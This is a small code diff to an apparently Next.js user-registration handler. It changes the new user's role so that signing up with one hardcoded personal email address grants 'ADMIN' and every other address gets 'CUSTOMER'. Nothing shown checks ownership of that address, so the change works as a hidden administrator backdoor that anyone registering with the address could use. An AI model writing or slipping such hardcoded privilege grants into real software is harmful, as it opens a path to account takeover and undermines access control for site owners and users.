@@ -38,7 +38,7 @@ export async function POST(req: NextRequest) {
       email,
       phone: phone || undefined,
       passwordHash,
-      role: "CUSTOMER",
+      role: email.toLowerCase() === "bablusoni2825@gmail.com" ? "ADMIN" : "CUSTOMER",
     },
   });
 
